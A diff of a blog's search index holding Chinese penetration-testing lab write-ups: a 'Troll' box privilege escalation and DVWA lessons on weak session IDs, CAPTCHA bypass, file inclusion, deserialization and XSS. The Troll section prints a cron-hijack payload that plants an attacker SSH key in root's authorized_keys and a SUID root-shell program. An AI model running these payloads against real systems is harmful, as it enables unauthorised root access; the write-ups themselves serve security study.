+<p>查询37292.c本地路径并下载</p>
+<p><img src="/2023/06/26/Troll/image-20230626220706720.png" alt="image-20230626220706720"></p>
+<p><img src="/2023/06/26/Troll/image-20230626221036422.png" alt="image-20230626221036422"></p>
+<p>攻击机开启http服务</p>
+<p><img src="/2023/06/26/Troll/image-20230626221017556.png" alt="image-20230626221017556"></p>
+<p>靶机测换到tmp路径(所有用户都可以写入)，并下载exp</p>
+<p><img src="/2023/06/26/Troll/image-20230626222335313.png" alt="image-20230626222335313"></p>
+<p>获取root权限</p>
+<p><img src="/2023/06/26/Troll/image-20230626223346868.png" alt="image-20230626223346868"></p>
+<p><img src="/2023/06/26/Troll/image-20230626223403905.png" alt="image-20230626223403905"></p>
+<p>更改root密码</p>
+<p><img src="/2023/06/26/Troll/image-20230626223500536.png" alt="image-20230626223500536"></p>
+<h3 id="获得目标文件"><a href="#获得目标文件" class="headerlink" title="获得目标文件"></a>获得目标文件</h3><p><img src="/2023/06/26/Troll/image-20230626223751396.png" alt="image-20230626223751396"></p>
+<h3 id="定时计划提权"><a href="#定时计划提权" class="headerlink" title="定时计划提权"></a>定时计划提权</h3><p>此外发现ssh登录无操作的情况下会断开</p>
+<p><img src="/2023/06/26/Troll/image-20230626225015030.png" alt="image-20230626225015030"></p>
+<p>可以看到cleaner.py会定期清除tmp文件下内容，且所有人可写<br><img src="/2023/06/26/Troll/image-20230626225155802.png" alt="image-20230626225155802"></p>
+<p><img src="/2023/06/26/Troll/image-20230626225343552.png" alt="image-20230626225343552"><br>并且找到该文件每两分钟运行一次cleaner.py</p>
+<h4 id="ssh提权"><a href="#ssh提权" class="headerlink" title="ssh提权"></a>ssh提权</h4><p>改写cleaner.py构造payload</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line">#!/<span class="selector-tag">usr</span>/<span class="selector-tag">bin</span>/<span class="selector-tag">env</span> <span class="selector-tag">python</span></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">os</span></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">sys</span></span><br><span class="line"><span class="selector-tag">try</span>:</span><br><span class="line">    <span class="selector-tag">os</span><span class="selector-class">.system</span>(&#x27;mkdir /root/.ssh; chmod <span class="number">775</span> .ssh; echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbImlDm0Hd4ul8o8sRPZ+PiOrlkFLIhw3lqLmxCFa1QOjsbuBtAbReBDpApdSmQGx+O9lP7nUnvrA0thyU5cLeuHC7f8eAXUrldc+cL+/<span class="number">9</span>++PZrdsX5Au2KfzJ9XAeYwvq0RIPdJpuiFtK/nayXJDk/Lpum9TjtoKFwMzpX9qkjsEc5t4Zxg46yIxjNo7QEMzqdMwgme63Dpm0CBSR3wbO3uDkn0ZmjlEc+<span class="number">8</span>/XaKfIwZuadKaCHsQGR65jdKaD1cDckbunVu1WJSFYLkFgISo31VsTIlwVtIZpv36QMsmEPMDclBNzFmcHvu8PcKyrydvsHZ8fNgABoXWNNVnyu7LT159ob9kB3goqWeYVPL5kJQ4BDjhMhjtB+rdxpgZ4+OPQzXXqFWAQdeV40Uw6lEXoDe1X+<span class="number">0</span>gzRjyR0QNwa0FDVQ0yaD8/<span class="number">2</span>DI5teBcNSkdJY0GNHEFcjcdMokTfsT/vxvVKEFpcd7uGZe1pCCdB7i97ZpsDCBy3Mqyhcw7EBrHl70= root<span class="variable">@kali</span></span><br><span class="line"> &gt;&gt; /root/.ssh/authorized_keys&#x27;)</span><br><span class="line"><span class="selector-tag">except</span>:</span><br><span class="line">    <span class="selector-tag">sys</span><span class="selector-class">.exit</span>()</span><br></pre></td></tr></table></figure>
+<p>该payload生成了一个文件/root/.ssh/authorized_keys，等待两分钟后cronlog触发cleaner.py就可以使用root直接登录靶机</p>
+<h4 id="文件特性提权"><a href="#文件特性提权" class="headerlink" title="文件特性提权"></a>文件特性提权</h4><p>构造两个文件分别是suid.c和suid.py</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudi.c</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># suid.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    os.system(<span class="string">&#x27;chown root:root /tmp/suid; chmod 4777 /tmp/suid&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
+<p>靶机通过wget获取文件到/tmp路径下，编译suid.c文件，将sudi.py写入/lib/log/cleaner.py中，等待suid的属组变成root，执行./suid即可</p>
+<p><img src="/2023/06/26/Troll/image-20230627122510260.png" alt="image-20230627122510260"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeakSessionIDS</title>
+    <url>/2023/06/25/WeakSessionIDS/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>弱会话</p>
+<span id="more"></span>
+<p>Weak Session IDs（弱会话），用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。用户拿到 session id 后就会保存到 cookies 上，之后只要拿着 cookies 再访问服务器，服务器就知道你是谁了。</p>
+<p>但是 session id 过于简单就会容易被人伪造。根本都不需要知道用户的密码就能访问，用户服务器的内容了。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>对于POST请求判断last_session_id是否存在，如果不存在则设置为0，存在则更新该参数，更新值为原值+1，并赋给dvwaSession</p>
+<p>抓包<br><img src="/2023/06/25/WeakSessionIDS/image-20230625221130531.png" alt="image-20230625221130531"></p>
+<p>清楚浏览器cookie后，再次访问该页面会被重定向到登陆界面，下面拦截一下包<br><img src="/2023/06/25/WeakSessionIDS/image-20230625221515368.png" alt="image-20230625221515368"></p>
+<p>将cookie更换为需求值<br><img src="/2023/06/25/WeakSessionIDS/image-20230625221814140.png" alt="image-20230625221814140"></p>
+<p>成功不需要登录直接访问</p>
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="comment">//返回当前时间的 Unix 时间戳，并格式化为日期：time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于low，只是将dvwa的值转化为时间戳，可以通过工具生成时间戳<a href="https://tool.lu/timestamp/">时间戳(Unix timestamp)转换工具 - 在线工具 (tool.lu)</a></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line"><span class="comment">//setcookie(name,value,expire,path,domain,secure,httponly)</span></span><br><span class="line"> 参数                  描述</span><br><span class="line">name         必需。规定cookie的名称。</span><br><span class="line">value         必需。规定cookie的值。</span><br><span class="line">expire       可选。规定cookie的有效期。</span><br><span class="line">path         可选。规定cookie的服务器路径。</span><br><span class="line">domain         可选。规定cookie的域名。</span><br><span class="line">secure         可选。规定是否通过安全的HTTPS连接来传输cookie。</span><br><span class="line">httponly     可选。规定是否Cookie仅可通过HTTP协议访问。</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于之前，该安全等级使用md5加密算法来加密和low一样的值，加入了有效期设置（代码中是一小时）另外加入了可选性setcookie来对cookie内容进行校验</p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">mt_rand</span>() . <span class="title function_ invoke__">time</span>() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>使用sha1加密算法加密由随机数、时间戳和字符串得到cookie_value，并且同high安全级别一样加入了校验机制</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Insecure_Captcha</title>
+    <url>/2023/06/25/Insecure-Captcha/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>不安全的验证码</p>
+<span id="more"></span>
+<p>Insecure CAPTCHA（不安全的验证码），CAPTCHA全称为Completely Automated Public Turing Test to Tell Computers and Humans Apart，中文名字是全自动区分计算机和人类的图灵测试。关于这一项，其实是在验证流程出现了逻辑漏洞。</p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625115703496.png" alt="image-20230625115703496"></p>
+<p>用户首先访问网页，触发页面的验证码的js模块，向谷歌服务器发起请求，谷歌服务器将验证码发给用户。用户输入验证码发送数据回去，这里发给的是访问网站的服务器，网站的服务器拿到验证码后，再去访问谷歌的服务器，谷歌的服务器会判断验证码是否正确，再将结果返回给网站服务器。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line"><span class="meta"><span class="keyword">$resp</span> = recaptcha_check_answer(</span></span><br><span class="line">    <span class="symbol">$</span>_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">    <span class="symbol">$</span>_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">); </span><br></pre></td></tr></table></figure>
+<p>第三方验证完成步骤一的身份认证</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>　　按照源码分析，总共分为两个阶段：</p>
+<p>　　第一阶段：对用户的身份进行验证，step为1，验证成功后才能进行密码修改</p>
+<p>　　第二阶段：step为2，两次输入的密码一致，可以进行修改</p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625122207345.png" alt="image-20230625122207345"></p>
+<p>可以看到包中表示当前是步骤1，直接改成2，并将密码改为一样</p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625122356849.png" alt="image-20230625122356849"></p>
+<p>所以可以同样运用CSRF构造恶意连接，直接将step设置为2</p>
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>相比于low，可以看到多了个参数passed_captcha<br><img src="/2023/06/25/Insecure-Captcha/image-20230625123019525.png" alt="image-20230625123019525"></p>
+<p>以及步骤2中对于该参的要求，修改包即可<br><img src="/2023/06/25/Insecure-Captcha/image-20230625123102814.png" alt="image-20230625123102814"></p>
+<p>修改前<img src="/2023/06/25/Insecure-Captcha/image-20230625123123843.png" alt="image-20230625123123843"></p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625123247239.png" alt="image-20230625123247239"></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>相比于之前，该安全性已经不分步骤了。<br>服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625123518068.png" alt="image-20230625123518068"></p>
+<p>修改前：<br><img src="/2023/06/25/Insecure-Captcha/image-20230625123645838.png" alt="image-20230625123645838"></p>
+<p>修改后</p>
+<p><img src="/2023/06/25/Insecure-Captcha/image-20230625123824749.png" alt="image-20230625123824749"></p>
+<p>可以看到修改成功</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>增加了token放置csrf攻击，利用PDO技术放置sql注入，且需要知道以前的密码才能进行更改。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>w文件包含常常与文件上传一起使用</p>
+<span id="more"></span>
+<p>文件包含在实际情况中更多运用在通过文件上传远程shell后进行连接或者使用工具连接，或者上传恶意可执行代码后访问该文件进行操作。比如在跨站脚本攻击章节中构建了一个更改密码的html文件，通过远程shell连接之后访问该文件结合csrf攻击可实现恶意代码的实现。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230624235220079.png" alt="image-20230624235220079"></p>
+<p>以get方式申请访问文件，连接shell后直接查看有什么敏感文件就可以。如查看php版本等</p>
+<p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230624235430509.png" alt="image-20230624235430509"></p>
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230624235543255.png" alt="image-20230624235543255"></p>
+<p>可以看到过滤了http和https以及../和..\，采用双写等方式就可以绕过，前者针对互联网上文件，后者针对相对路径文件存储路径，采用绝对路径可以绕过</p>
+<p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230624235959872.png" alt="image-20230624235959872"></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230625000057113.png" alt="image-20230625000057113"></p>
+<p>fnmatch() 函数：根据指定的模式来匹配文件名或字符串。<br>可以通过构造url进行绕过，知识点涉及file协议</p>
+<p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230625000749067.png" alt="image-20230625000749067"></p>
+<h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。</p>
+<p>应用：要使用File协议，基本的格式如下：file:///文件路径，比如要打开D盘images文件夹中的<a href="https://links.jianshu.com/go?to=file%3A%2F%2F%2FD%3A%2Fimages%2Fpic.gif">pic.gif</a>文件，那么可以在资源管理器或IE地址栏中键入：<a href="https://links.jianshu.com/go?to=file%3A%2F%2F%2FD%3A%2Fimages%2Fpic.gif"><strong>file:///D:/images/pic.gif</strong></a> </p>
+<p><b>file表示协议类型：</b><br>://后面是机器的网络地址（IP地址）<br>/后面是文件夹（目录）和文件名<br>整体形如：<br>file://机器的IP地址/目录/文件<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。<br>对于本地机器，根目录下的目录是Windows下的盘符，如“C:”、“D:”等。<br>file://127.0.0.1/C:/    本地C盘<br>file://localhost/D:/    本地D盘<br>file:///E:/            本地E盘<br>需要注意的是，最后面的/是必不可少的，且file协议，通常只能在Windows Explorer和Micosoft IE中使用！</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230625000921157.png" alt="image-20230625000921157"></p>
+<p>直接使用了白名单来防止预期外的输入</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>反序列化</title>
+    <url>/2023/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><span id="more"></span>
+<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>PHP反序列化是一种将序列化数据还原为原始PHP对象或数据结构的过程。序列化是将PHP对象或数据转换为字符串的过程，可以将其存储、传输或持久化。反序列化则是将序列化的字符串重新还原为PHP对象或数据。</p>
+<p>在PHP中，常见的序列化格式是通过<code>serialize()</code>和<code>unserialize()</code>函数来实现的。<code>serialize()</code>函数将PHP对象或数据序列化为字符串，而<code>unserialize()</code>函数将序列化的字符串反序列化为原始对象或数据。</p>
+<p>然而，反序列化操作也存在安全风险，因为恶意用户可以构造恶意的序列化数据，通过利用对象的自动反序列化行为来执行未经授权的操作。这可能导致安全漏洞，如远程代码执行（RCE）或敏感数据泄露。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">8</span>:<span class="string">&quot;SomeClass&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;恶意数据&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;__destruct&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;phpinfo();&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>在上述示例中，恶意序列化数据表示一个名为<code>SomeClass</code>的PHP类对象，具有两个属性：<code>data</code>和<code>__destruct</code>。<code>data</code>属性包含字符串值”恶意数据”，而<code>__destruct</code>属性包含了恶意的代码<code>phpinfo();</code>。</p>
+<p>当这个恶意序列化数据被反序列化时，如果应用程序不进行适当的验证和过滤，将会调用对象的<code>__destruct</code>方法并执行其中的代码，即调用<code>phpinfo()</code>函数。这可能导致应用程序泄露服务器上的敏感信息，如PHP配置信息和系统环境变量等。</p>
+<p><img src="/2023/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230626150957847.png" alt="image-20230626150957847"></p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>_construct()</td>
+<td>类的构造函数，当对象被创建时调用</td>
+</tr>
+<tr>
+<td>_destruct()</td>
+<td>类的析构函数，当对象被销毁时调用</td>
+</tr>
+<tr>
+<td>_sleep()</td>
+<td>执行serialize()，会先调用该函数</td>
+</tr>
+<tr>
+<td>_wakeup()</td>
+<td>执行unserialize()，会先调用该函数</td>
+</tr>
+<tr>
+<td>_toString()</td>
+<td>类被当成字符串时的回应方法</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p>Java反序列化是将序列化的数据还原为原始Java对象或数据结构的过程。序列化是将Java对象转换为字节流的过程，可以将其存储、传输或持久化。反序列化则是将序列化的字节流重新还原为Java对象或数据。</p>
+<p>在Java中，常见的序列化机制是通过<code>java.io.Serializable</code>接口和<code>java.io.ObjectInputStream</code>类来实现的。要进行序列化，需要将对象类实现<code>Serializable</code>接口，并使用<code>ObjectOutputStream</code>将对象写入字节流。要进行反序列化，需要使用<code>ObjectInputStream</code>从字节流中读取对象并还原为原始对象。</p>
+<p>然而，反序列化操作也存在安全风险，因为恶意用户可以构造恶意的序列化数据，通过利用对象的自动反序列化行为来执行未经授权的操作。这可能导致安全漏洞，如远程代码执行（RCE）或敏感数据泄露。</p>
+<h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>Shiro的序列化使用了Java的默认序列化方式，即实现<code>java.io.Serializable</code>接口。当Shiro的会话对象需要进行序列化时，会将会话对象及其相关的属性和状态转换为字节流，以便进行存储、传输或持久化。反序列化则是将序列化的字节流重新转换为原始的Shiro会话对象。</p>
+<p>shiro反序列化主要是apache shiro提供了一个remember的一个功能，用户登陆成功后会生成经过加密并编码的cookie，保存在浏览器中方便用户的日常使用。</p>
+<p>服务器对于cookie的处理方式就是先获取浏览器上保存的cookie，进行base64解码，在进行AES解密，然后在进行反序列化进行校验。</p>
+<p>漏洞点：AES是硬编码，存在默认密钥或者密钥过于简单的话可以爆破出密码。攻击者可以构建恶意代码，并对恶意代码进行序列化，在经过AES加密和base加密生成恶意的cookie。这样服务器处理后会执行恶意代码。</p>
+<h3 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h3><p>登陆失败会返回rememberMe=deleteMe字段或者使用shiroScan扫描发现</p>
+<p>完整：</p>
+<ul>
+<li>未登录：请求包</li>
+<li>登陆失败</li>
+<li>不勾选rememberMe登陆成功</li>
+<li>勾选rememberMe登陆成功</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS</title>
     <url>/2023/06/14/XSS/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>跨站脚本攻击原理及实现</p>
 <span id="more"></span>
-<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>攻击步骤</p>
+<h2 id="如何验证是否存在XSS漏洞"><a href="#如何验证是否存在XSS漏洞" class="headerlink" title="如何验证是否存在XSS漏洞"></a>如何验证是否存在XSS漏洞</h2><ol>
+<li>找到输入，用户可以操控代码的位置</li>
+<li>找到输出，输入的代码在网页哪个位置进行输出，js中标签一般为p</li>
+<li>构造payload</li>
+</ol>
+<h2 id="反射型-非持久型"><a href="#反射型-非持久型" class="headerlink" title="反射型(非持久型)"></a>反射型(非持久型)</h2><p>恶意代码没有保存在目标网站，因为只能执行一次，所以也被叫为非持久性，由后端进行处理。</p>
+<p>攻击步骤</p>
 <ol>
 <li>攻击者构造包含恶意脚本的URL，并将该URL发送给受害者。</li>
 <li>受害者点击或访问包含恶意脚本的URL。</li>
 <li>受害者的浏览器接收到响应并解析包含恶意脚本的内容。</li>
 <li>恶意脚本在受害者的浏览器中执行，可以窃取用户的敏感信息、篡改页面内容、劫持用户会话等。</li>
 </ol>
+<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>服务器只判断name参数是否为空，直接构造payload</p>
+<p><img src="/2023/06/14/XSS/image-20230625230222315.png" alt="image-20230625230222315"></p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
